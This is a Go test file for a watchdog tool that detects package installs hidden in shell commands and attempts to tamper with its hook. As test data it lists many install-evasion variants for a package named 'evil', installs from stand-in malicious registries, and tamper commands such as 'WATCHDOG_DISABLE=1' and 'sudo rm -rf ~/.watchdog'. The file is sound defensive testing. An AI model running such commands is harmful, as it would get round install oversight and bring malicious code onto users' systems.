package parsers

import (
	"slices"
	"strings"
	"testing"

	"github.com/Maxlemore97/watchdog/internal/types"
)

// Regression table for install-detection bypasses reported in the
// 2026-10 security review. Each command must surface the hidden
// package (or, where the package cannot be known statically, a note
// that forces `ask`).
func TestCollectPackages_Bypasses(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		pkg  string // expected package name ("" = note expected instead)
		note string // substring expected in notes (optional)
	}{
		// Global flags before the subcommand.
		{"npm global flag first", "npm -g install evil", "evil", ""},
		{"npm loglevel value first", "npm --loglevel silent install evil", "evil", ""},
		{"npm inline flag first", "npm --loglevel=silent install evil", "evil", ""},
		{"pip quiet first", "pip -q install evil", "evil", ""},
		{"uv quiet pip", "uv --quiet pip install evil", "evil", ""},

		// npm abbreviations / typo aliases.
		{"npm in", "npm in evil", "evil", ""},
		{"npm isntall", "npm isntall evil", "evil", ""},
		{"npm it", "npm it evil", "evil", ""},

		// Multi-word installs.
		{"yarn global add", "yarn global add evil", "evil", ""},
		{"composer global require", "composer global require vendor/evil", "vendor/evil", ""},
		{"uv tool install", "uv tool install evil", "evil", ""},
		{"dotnet tool install", "dotnet tool install -g evil", "evil", ""},
		{"go get", "go get example.com/evil@v1.0.0", "example.com/evil", ""},

		// Exec-style runners.
		{"npx", "npx -y evil --flag x", "evil", ""},
		{"npx package flag", "npx -p evil some-bin", "evil", ""},
		{"npm exec", "npm exec -- evil", "evil", ""},
		{"npm x", "npm x evil", "evil", ""},
		{"pnpm dlx", "pnpm dlx evil", "evil", ""},
		{"yarn dlx", "yarn dlx evil", "evil", ""},
		{"bunx", "bunx evil", "evil", ""},
		{"bun x", "bun x evil", "evil", ""},
		{"uvx", "uvx evil", "evil", ""},
		{"uvx from", "uvx --from evil cli", "evil", ""},
		{"uv tool run", "uv tool run evil", "evil", ""},
		{"uv run with", "uv run --with evil script.py", "evil", ""},
		{"pipx run", "pipx run evil", "evil", ""},
		{"go run remote", "go run example.com/evil@latest", "example.com/evil", ""},

		// Interpreter-routed pip.
		{"python -m pip", "python -m pip install evil", "evil", ""},
		{"python3.12 -m pip", "python3.12 -m pip install evil", "evil", ""},
		{"pip3.12", "pip3.12 install evil", "evil", ""},

		// Separators the old splitter ignored.
		{"newline", "true\nnpm install evil", "evil", ""},
		{"pipe", "true | npm i evil", "evil", ""},
		{"background", "sleep 1 & npm i evil", "evil", ""},
		{"line continuation", "npm install \\\nevil", "evil", ""},

		// Grouping, substitutions, keywords.
		{"subshell parens", "(npm i evil)", "evil", ""},
		{"brace group", "{ npm i evil; }", "evil", ""},
		{"if then", "if true; then npm i evil; fi", "evil", ""},
		{"command substitution", "echo $(npm i evil)", "evil", ""},
		{"backticks", "echo `npm i evil`", "evil", ""},
		{"process substitution", "cat <(npm i evil)", "evil", ""},
		{"bash -lc", `bash -lc "npm i evil"`, "evil", ""},
		{"sudo bash -c", `sudo bash -c "npm i evil"`, "evil", ""},
		{"eval", `eval "npm i evil"`, "evil", ""},

		// Wrapper prefixes.
		{"env prefix", "env FOO=1 npm i evil", "evil", ""},
		{"assignment prefix", "FOO=1 npm i evil", "evil", ""},
		{"command prefix", "command npm i evil", "evil", ""},
		{"sudo prefix", "sudo -u root npm i evil", "evil", ""},
		{"timeout prefix", "timeout 30 npm i evil", "evil", ""},
		{"nohup prefix", "nohup npm i evil", "evil", ""},
		{"xargs", "echo evil | xargs npm install", "", "runtime via xargs"},

		// Redirections must not become package names.
		{"redirect stays out", "npm i evil >/dev/null 2>&1", "evil", ""},

		// Registry / source overrides.
		{"npm registry", "npm i --registry https://evil.tld lodash", "lodash", "custom registry"},
		{"pip extra index", "pip install --extra-index-url https://evil requests", "requests", "custom registry"},
		{"pip -i", "pip install -i https://evil requests", "requests", "custom registry"},
		{"cargo git", "cargo install --git https://evil foo", "foo", "custom registry"},
		{"gem source", "gem install --source https://evil rails", "rails", "custom registry"},
		{"composer repository", "composer require --repository https://evil vendor/pkg", "vendor/pkg", "custom registry"},
		{"registry env", "npm_config_registry=https://evil npm i lodash", "lodash", "registry override"},
		{"pip index env", "PIP_INDEX_URL=https://evil pip install requests", "requests", "registry override"},

		// Non-registry specs.
		{"npm alias", "npm i lodash@npm:evil", "", "url/path"},
		{"npm github", "npm i github:evil/pkg", "", "url/path"},
		{"pep508 direct ref", "pip install 'foo @ https://evil/x.whl'", "", "url/path"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			pkgs, notes := CollectPackages(tc.cmd, nil)
			if tc.pkg != "" {
				found := slices.ContainsFunc(pkgs, func(p types.Package) bool { return p.Name == tc.pkg })
				if !found {
					t.Errorf("CollectPackages(%q): package %q not detected; pkgs=%v notes=%v", tc.cmd, tc.pkg, pkgs, notes)
				}
			}
			if tc.note != "" {
				if !slices.ContainsFunc(notes, func(n string) bool { return strings.Contains(n, tc.note) }) {
					t.Errorf("CollectPackages(%q): note %q missing; notes=%v", tc.cmd, tc.note, notes)
				}
			}
			if tc.pkg == "" && tc.note == "" {
				t.Fatal("bad case")
			}
			for _, p := range pkgs {
				if strings.HasPrefix(p.Name, ">") || strings.HasPrefix(p.Name, "2>") || strings.Contains(p.Name, "/dev/null") {
					t.Errorf("redirection parsed as package: %v", p)
				}
			}
		})
	}
}

// Commands that must stay non-install so the hook does not nag on
// everyday shell use.
func TestCollectPackages_NoFalsePositives(t *testing.T) {
	for _, cmd := range []string{
		"npm test",
		"npm run build",
		"npm install",
		"pip list",
		"go run .",
		"go run ./cmd/x",
		"go build ./...",
		"uv run pytest",
		"echo npm install evil",
		"grep -n 'npm install' README.md",
		"cargo build --release",
		"ls | wc -l",
		"echo $((1+2))",
	} {
		pkgs, notes := CollectPackages(cmd, nil)
		if len(pkgs) != 0 || len(notes) != 0 {
			t.Errorf("CollectPackages(%q) = %v / %v, want nothing", cmd, pkgs, notes)
		}
	}
}

func TestTamperPatterns_WatchdogEnvOverride(t *testing.T) {
	for _, cmd := range []string{
		"WATCHDOG_DISABLE=1 npm install evil",
		"export WATCHDOG_MODE=osv",
		"env WATCHDOG_FAILCLOSED_VERDICT=allow npm i evil",
		"WATCHDOG_SHIMMED_TOOLS_SKIP=npm npm i evil",
		"declare -x WATCHDOG_DISABLE=1",
		"launchctl setenv WATCHDOG_DISABLE 1",
		`bash -c "WATCHDOG_DISABLE=1 npm i evil"`,
	} {
		got := TamperPatterns(cmd)
		if !slices.Contains(got, TamperWatchdogEnv) {
			t.Errorf("TamperPatterns(%q) = %v, want %s", cmd, got, TamperWatchdogEnv)
		}
	}
	// Reading or mentioning the variable is fine.
	for _, cmd := range []string{
		`echo "$WATCHDOG_MODE"`,
		"env | grep WATCHDOG_",
	} {
		if got := TamperPatterns(cmd); slices.Contains(got, TamperWatchdogEnv) {
			t.Errorf("TamperPatterns(%q) = %v, want no %s", cmd, got, TamperWatchdogEnv)
		}
	}
}

func TestTamperPatterns_PathQualifiedThroughPrefixes(t *testing.T) {
	for _, cmd := range []string{
		"sudo /usr/local/bin/npm install evil",
		"./node_modules/.bin/pnpm add evil",
		"/usr/local/bin/npx evil",
		"/opt/homebrew/bin/npm -g install evil",
	} {
		if got := TamperPatterns(cmd); !slices.Contains(got, TamperAbsPathInstall) {
			t.Errorf("TamperPatterns(%q) = %v, want %s", cmd, got, TamperAbsPathInstall)
		}
	}
	if got := TamperPatterns("sudo rm -rf ~/.watchdog"); !slices.Contains(got, TamperWatchdogRemove) {
		t.Errorf("sudo rm of ~/.watchdog not flagged: %v", got)
	}
}
